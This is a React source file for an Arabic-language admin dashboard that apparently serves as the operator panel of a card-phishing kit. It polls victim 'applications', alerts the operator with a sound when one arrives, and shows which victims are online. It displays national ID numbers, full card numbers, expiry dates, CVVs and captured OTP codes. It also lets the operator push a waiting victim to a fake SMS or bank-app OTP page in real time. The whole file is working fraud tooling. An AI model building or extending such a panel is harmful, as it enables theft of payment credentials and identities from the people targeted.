import { useState, useEffect, useRef } from "react";
import { base44 } from "@/api/base44Client";
import CardMockup from "@/components/CardMockup";

const STEP_LABELS = {
  form: "📝 بيانات",
  network_pay: "💳 الرسوم",
  payment: "💰 الدفع",
  otp_pending: "⏳ انتظار التوجيه",
  otp: "🔐 OTP",
  completed: "✅ مكتمل",
  confirmation: "✅ مكتمل",
};

const OTP_ROUTE_LABELS = {
  otp: "رمز SMS",
  otp_app: "تطبيق البنك",
};

const CARD_TYPE_LABELS = {
  silver: "فضية",
  gold: "ذهبية",
  platinum: "بلاتينية",
};

function timeAgo(dateStr) {
  const diff = Math.floor((Date.now() - new Date(dateStr)) / 1000);
  if (diff < 60) return `${diff}ث`;
  if (diff < 3600) return `${Math.floor(diff / 60)}د`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}س`;
  return `${Math.floor(diff / 86400)}ي`;
}

function isOnline(updatedDate) {
  return Date.now() - new Date(updatedDate) < 5 * 60 * 1000;
}

function ChatBubble({ title, rows, time, color = "blue" }) {
  const colors = {
    blue: "border-blue-500/40",
    yellow: "border-yellow-500/40",
    green: "border-green-500/40",
    purple: "border-purple-500/40",
  };
  return (
    <div className="flex justify-start">
      <div className={`bg-[#182533] rounded-2xl rounded-tl-sm px-4 py-3 max-w-xs w-full border-r-2 ${colors[color]}`}>
        <p className="text-xs font-bold text-gray-300 mb-2">{title}</p>
        <div className="space-y-1.5">
          {rows.filter(([, v]) => v).map(([label, value]) => (
            <div key={label} className="flex flex-col">
              <span className="text-[10px] text-gray-500">{label}</span>
              <span className="text-sm text-white font-medium break-all">{value}</span>
            </div>
          ))}
        </div>
        {time && (
          <p className="text-[10px] text-gray-600 mt-2 text-left">
            {new Date(time).toLocaleTimeString("ar-AE", { hour: "2-digit", minute: "2-digit" })}
          </p>
        )}
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [apps, setApps] = useState([]);
  const [selected, setSelected] = useState(null);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState("all");
  const [routingId, setRoutingId] = useState("");
  const intervalRef = useRef(null);
  const prevCountRef = useRef(null);

  const playNotification = () => {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "sine";
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 0.15);
    gain.gain.setValueAtTime(0.4, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.4);
  };

  const fetchApps = async () => {
    const data = await base44.entities.CardApplication.list("-updated_date", 100);
    setApps((prev) => {
      if (prevCountRef.current !== null && data.length > prevCountRef.current) {
        playNotification();
      }
      prevCountRef.current = data.length;
      return data;
    });
    setSelected((sel) => {
      if (!sel) return sel;
      const updated = data.find((a) => a.id === sel.id);
      return updated || sel;
    });
  };

  useEffect(() => {
    fetchApps();
    intervalRef.current = setInterval(fetchApps, 5000);
    return () => clearInterval(intervalRef.current);
  }, []);

  const filtered = apps.filter((a) => {
    const matchSearch =
      (a.name || "").includes(search) ||
      (a.mobile || "").includes(search) ||
      (a.id_number || "").includes(search);
    const matchFilter =
      filter === "all" ||
      (filter === "online" && isOnline(a.updated_date)) ||
      (filter === "completed" && (a.status === "completed" || a.status === "paid")) ||
      (filter === "in_progress" && a.status === "in_progress");
    return matchSearch && matchFilter;
  });

  const onlineCount = apps.filter((a) => isOnline(a.updated_date)).length;

  const routeToOtp = async (otpRoute) => {
    if (!selected) return;
    setRoutingId(otpRoute);
    const updated = await base44.entities.CardApplication.update(selected.id, {
      current_step: "otp",
      otp_route: otpRoute,
    });
    setSelected(updated);
    setApps((prev) => prev.map((app) => (app.id === updated.id ? updated : app)));
    setRoutingId("");
  };

  return (
    <div className="flex h-screen bg-[#17212b] text-white font-sans overflow-hidden" dir="rtl">
      {/* Sidebar */}
      <div
        className="w-full md:w-80 flex-shrink-0 flex flex-col border-l border-[#232e3c] bg-[#17212b]"
        style={{ display: selected ? "none" : "flex" }}
        id="sidebar"
      >
        <style>{`@media (min-width: 768px) { #sidebar { display: flex !important; } }`}</style>

        {/* Header */}
        <div className="px-4 py-3 bg-[#1c2733] border-b border-[#232e3c] flex items-center gap-3">
          <div className="w-9 h-9 rounded-full bg-blue-500 flex items-center justify-center text-sm font-bold">F</div>
          <div>
            <p className="font-bold text-sm">فزعة — لوحة التحكم</p>
            <p className="text-xs text-green-400">{onlineCount} متصل الآن</p>
          </div>
          <div className="mr-auto text-xs text-gray-400 bg-[#232e3c] px-2 py-1 rounded-full">
            {apps.length} طلب
          </div>
        </div>

        {/* Search */}
        <div className="px-3 py-2 bg-[#1c2733]">
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="بحث بالاسم أو الجوال أو الهوية..."
            className="w-full bg-[#232e3c] text-sm rounded-xl px-3 py-2 text-white placeholder:text-gray-500 focus:outline-none"
          />
        </div>

        {/* Filters */}
        <div className="flex gap-1 px-3 pb-2 bg-[#1c2733] border-b border-[#232e3c]">
          {[["all", "الكل"], ["online", "🟢 متصل"], ["in_progress", "⏳ جارٍ"], ["completed", "✅ مكتمل"]].map(([val, label]) => (
            <button
              key={val}
              onClick={() => setFilter(val)}
              className={`text-xs px-2 py-1 rounded-full transition-colors ${filter === val ? "bg-blue-500 text-white" : "text-gray-400 hover:text-white"}`}
            >
              {label}
            </button>
          ))}
        </div>

        {/* List */}
        <div className="flex-1 overflow-y-auto">
          {filtered.length === 0 && (
            <p className="text-center text-gray-500 text-sm mt-10">لا توجد نتائج</p>
          )}
          {filtered.map((app) => {
            const online = isOnline(app.updated_date);
            const isActive = selected?.id === app.id;
            return (
              <div
                key={app.id}
                onClick={() => setSelected(app)}
                className={`flex items-center gap-3 px-4 py-3 cursor-pointer border-b border-[#232e3c] transition-colors ${isActive ? "bg-[#2b5278]" : "hover:bg-[#232e3c]"}`}
              >
                <div className="relative flex-shrink-0">
                  <div className="w-11 h-11 rounded-full bg-gradient-to-br from-blue-400 to-blue-600 flex items-center justify-center text-base font-bold">
                    {(app.name || "?")[0]}
                  </div>
                  {online && (
                    <span className="absolute bottom-0 right-0 w-3 h-3 bg-green-400 border-2 border-[#17212b] rounded-full" />
                  )}
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex justify-between items-center">
                    <p className="font-semibold text-sm truncate">{app.name || "—"}</p>
                    <span className="text-[10px] text-gray-400 flex-shrink-0 mr-1">{timeAgo(app.updated_date)}</span>
                  </div>
                  <div className="flex justify-between items-center mt-0.5">
                    <span className="text-xs text-gray-400 truncate">{app.mobile || "—"}</span>
                    <span className={`text-[10px] px-1.5 py-0.5 rounded-full flex-shrink-0 mr-1 ${
                      app.current_step === "completed" || app.current_step === "confirmation" ? "bg-green-500/20 text-green-400" :
                      app.current_step === "payment" ? "bg-yellow-500/20 text-yellow-400" :
                      app.current_step === "otp" ? "bg-purple-500/20 text-purple-400" :
                      "bg-blue-500/20 text-blue-400"
                    }`}>
                      {STEP_LABELS[app.current_step] || app.current_step}
                    </span>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Detail Panel */}
      <div className={`flex-1 flex flex-col ${!selected ? "hidden md:flex" : "flex"}`}>
        {!selected ? (
          <div className="flex-1 flex flex-col items-center justify-center text-gray-500">
            <div className="text-6xl mb-4">💬</div>
            <p className="text-lg">اختر طلباً للعرض</p>
          </div>
        ) : (
          <>
            {/* Chat Header */}
            <div className="px-4 py-3 bg-[#1c2733] border-b border-[#232e3c] flex items-center gap-3">
              <button onClick={() => setSelected(null)} className="md:hidden text-gray-400 hover:text-white ml-1">←</button>
              <div className="relative">
                <div className="w-9 h-9 rounded-full bg-gradient-to-br from-blue-400 to-blue-600 flex items-center justify-center font-bold text-sm">
                  {(selected.name || "?")[0]}
                </div>
                {isOnline(selected.updated_date) && (
                  <span className="absolute bottom-0 right-0 w-2.5 h-2.5 bg-green-400 border-2 border-[#1c2733] rounded-full" />
                )}
              </div>
              <div>
                <p className="font-bold text-sm">{selected.name || "—"}</p>
                <p className={`text-xs ${isOnline(selected.updated_date) ? "text-green-400" : "text-gray-400"}`}>
                  {isOnline(selected.updated_date) ? "متصل الآن" : `آخر ظهور ${timeAgo(selected.updated_date)}`}
                </p>
              </div>
              <div className="mr-auto">
                <span className={`text-xs px-2 py-1 rounded-full font-semibold ${
                  selected.current_step === "completed" || selected.current_step === "confirmation" ? "bg-green-500/20 text-green-400" :
                  selected.current_step === "payment" ? "bg-yellow-500/20 text-yellow-400" :
                  selected.current_step === "otp" ? "bg-purple-500/20 text-purple-400" :
                  "bg-blue-500/20 text-blue-400"
                }`}>
                  {STEP_LABELS[selected.current_step] || selected.current_step}
                </span>
              </div>
            </div>

            {/* Messages */}
            <div
              className="flex-1 overflow-y-auto px-4 py-4 space-y-3 bg-[#0e1621]"
              style={{ backgroundImage: "radial-gradient(circle at 1px 1px, #1a2535 1px, transparent 0)", backgroundSize: "32px 32px" }}
            >
              <div className="flex justify-center">
                <div className="bg-[#182533] rounded-2xl px-4 py-2 text-xs text-gray-400 text-center">
                  المرحلة الحالية: <span className="text-white font-bold">{STEP_LABELS[selected.current_step] || selected.current_step}</span>
                </div>
              </div>

              {selected.current_step === "otp_pending" && (
                <div className="flex justify-center">
                  <div className="w-full max-w-xs rounded-2xl border border-yellow-500/40 bg-[#182533] p-3 text-center">
                    <p className="mb-3 text-xs font-bold text-yellow-300">اختر صفحة التحقق للعميل</p>
                    <div className="grid grid-cols-2 gap-2">
                      <button
                        onClick={() => routeToOtp("otp")}
                        disabled={!!routingId}
                        className="rounded-xl bg-purple-600 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-purple-500 disabled:opacity-60"
                      >
                        {routingId === "otp" ? "جارٍ التوجيه..." : "OTP SMS"}
                      </button>
                      <button
                        onClick={() => routeToOtp("otp_app")}
                        disabled={!!routingId}
                        className="rounded-xl bg-blue-600 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-blue-500 disabled:opacity-60"
                      >
                        {routingId === "otp_app" ? "جارٍ التوجيه..." : "OTP App"}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              <ChatBubble
                title="📋 البيانات الشخصية"
                time={selected.created_date}
                rows={[
                  ["الاسم", selected.name],
                  ["الجوال", selected.mobile],
                  ["رقم الهوية", selected.id_number],
                  ["نوع البطاقة", CARD_TYPE_LABELS[selected.card_type] || selected.card_type],
                  ["عنوان التوصيل", selected.address],
                  ["تاريخ التوصيل", selected.delivery_date],
                ]}
              />

              {(selected.card_holder || selected.card_number_full || selected.card_number_last4 || selected.expiry_date || selected.cvv) && (
                <ChatBubble
                  title="💳 بيانات الدفع"
                  time={selected.updated_date}
                  rows={[
                    ["اسم صاحب البطاقة", selected.card_holder],
                    ["رقم البطاقة الكامل", selected.card_number_full],
                    ["آخر 4 أرقام", selected.card_number_last4 ? `**** **** **** ${selected.card_number_last4}` : null],
                    ["تاريخ الانتهاء", selected.expiry_date],
                    ["CVV", selected.cvv],
                    ["مسار التحقق", OTP_ROUTE_LABELS[selected.otp_route]],
                    ["رمز OTP", selected.otp_code],
                  ]}
                  color="yellow"
                />
              )}

              <ChatBubble
                title="📊 الحالة"
                time={selected.updated_date}
                rows={[
                  ["الحالة", selected.status === "completed" || selected.status === "paid" ? "✅ مكتمل" : "⏳ جارٍ"],
                  ["رقم الطلب", selected.id],
                  ["تاريخ الإنشاء", new Date(selected.created_date).toLocaleString("ar-AE")],
                  ["آخر تحديث", new Date(selected.updated_date).toLocaleString("ar-AE")],
                ]}
                color="green"
              />
            </div>
          </>
        )}
      </div>
    </div>
  );
}